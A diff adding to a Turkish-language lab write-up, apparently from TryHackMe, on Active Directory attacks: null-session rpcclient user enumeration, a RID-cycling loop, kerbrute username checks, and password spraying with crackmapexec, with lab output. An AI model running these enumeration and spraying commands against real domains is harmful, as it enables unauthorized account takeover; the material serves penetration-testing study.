@@ -134,7 +134,105 @@ bu rpcclient içine girer ve enumdomusers çalıştırdığımızda kullanıcıl
 
 Başarılı olursa kullanıcıları şu şekilde sıralayabiliriz:
 enumdomusers
+çıktı:
+```bash
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[sshd] rid:[0x649]
+user:[gerald.burgess] rid:[0x650]
+user:[nigel.parsons] rid:[0x651]
+user:[guy.smith] rid:[0x652]
+user:[jeremy.booth] rid:[0x653]
+user:[barbara.jones] rid:[0x654]
+user:[marion.kay] rid:[0x655]
+user:[kathryn.williams] rid:[0x656]
+user:[danny.baker] rid:[0x657]
+user:[gary.clarke] rid:[0x658]
+```
+--- 
+RID Cycling:
+
+```bash
+ for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done
 
 
+	User Name   :	sshd
+	User Name   :	gerald.burgess
+	User Name   :	nigel.parsons
+	User Name   :	guy.smith
+	User Name   :	jeremy.booth
+	User Name   :	barbara.jones 
+```
+---
+Eğer bir user listimiz var ise yukarıdan elde ettiysek,
+Kerbrute, Kerberos'a karşı kaba kuvvet kullanıcı adı numaralandırması gerçekleştirir :
 
+```bash
+kerbrute userenum --dc 10.211.11.10 -d tryhackme.loc users.txt
+```
+Çıktı:
+```
+2025/05/16 11:58:16 >  [+] VALID USERNAME:	 WRK$@tryhackme.loc
+2025/05/16 11:58:16 >  [+] VALID USERNAME:	 guy.smith@tryhackme.loc
+2025/05/16 11:58:16 >  [+] VALID USERNAME:	 sshd@tryhackme.loc
+2025/05/16 11:58:16 >  [+] VALID USERNAME:	 nigel.parsons@tryhackme.loc
+2025/05/16 11:58:16 >  [+] VALID USERNAME:	 gerald.burgess@tryhackme.loc
+2025/05/16 11:58:16 >  [+] VALID USERNAME:	 barbara.jones@tryhackme.loc
+2025/05/16 11:58:16 >  [+] VALID USERNAME:	 Administrator@tryhackme.loc
+```
+---
+Password Spraying
+Şifre püskürtme, küçük bir ortak şifre kümesinin birçok hesapta test edildiği bir saldırı tekniğidir. Kaba kuvvet saldırılarının aksine, şifre püskürtme, her hesabı yalnızca birkaç denemeyle test ederek hesap kilitlenmelerini önler ve birçok kuruluşta yaygın olan zayıf şifre uygulamalarından yararlanır. Şifre püskürtme genellikle etkilidir çünkü birçok kuruluş:
+
+Sık sık parola değişikliği gerektirebilir ve kullanıcıların tahmin edilebilir kalıplar seçmesine yol açabilir (örneğin, Summer2025!).
+Politikalarını iyi uygulamıyorlar.
+Birden fazla hesapta ortak parolaları yeniden kullanın.
+Spreyleme için yaygın şifre listeleri şunları içerir:
+
+Mevsimsel şifreler.
+BT ekipleri tarafından kullanılan varsayılan parolalar ( Password123).
+Veri ihlalleri sonucu sızdırılan şifreler, örneğin rockyou.txt.
+```bash
+rpcclient -U "" 10.211.11.10 -N
+```
+daha sonra içeride 
+```bash
+rpcclient $> getdompwinfo
+```
+çıktı:
+```
+min_password_length: 12
+password_properties: 0x00000001
+DOMAIN_PASSWORD_COMPLEX
+```
+CrackMapExec
+```bash
+ crackmapexec smb 10.211.11.10 --pass-pol
+```
+
+```bash
+ crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
+```
+çıktı
+```
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating missing folder logs
+[*] Creating missing folder modules
+[*] Creating missing folder protocols
+[*] Creating missing folder workspaces
+[*] Creating missing folder obfuscated_scripts
+[*] Creating missing folder screenshots
+[*] Copying default configuration file
+SMB         10.211.11.20    445    WRK              [*] Windows 10.0 Build 17763 x64 (name:WRK) (domain:tryhackme.loc) (signing:False) (SMBv1:False)
+SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\Administrator:Password! STATUS_LOGON_FAILURE
+SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\Guest:Password! STATUS_LOGON_FAILURE
+SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\krbtgt:Password! STATUS_LOGON_FAILURE
+SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\DC$:Password! STATUS_LOGON_FAILURE
+SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\WRK$:Password! STATUS_LOGON_FAILURE
+SMB         10.211.11.20    445    WRK              [-]
+SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\asrepuser1:Password1! STATUS_LOGON_FAILURE
+SMB         10.211.11.20    445    WRK              [+] tryhackme.loc\*****:******
+```
 
